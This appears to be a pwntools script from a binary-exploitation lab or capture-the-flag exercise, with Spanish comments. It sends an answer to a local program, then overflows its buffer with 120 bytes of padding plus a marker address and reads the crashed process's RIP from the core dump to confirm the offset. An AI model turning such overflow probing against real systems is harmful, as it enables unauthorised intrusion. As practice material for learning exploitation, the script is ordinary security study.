#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Crear proceso
p = process('/workspace/vuln')

# El número correcto es 84
p.sendline(b'84')

# Esperar a la pregunta del nombre
p.recvuntil(b'Name? ')

# Probar con offset de 120
payload = b'A' * 120 + p64(0x4141414141414141)
p.sendline(payload)

# Ver qué pasa
try:
    p.recvall(timeout=1)
except:
    pass

p.wait()
core = p.corefile
print(f"RIP: {hex(core.rip)}")
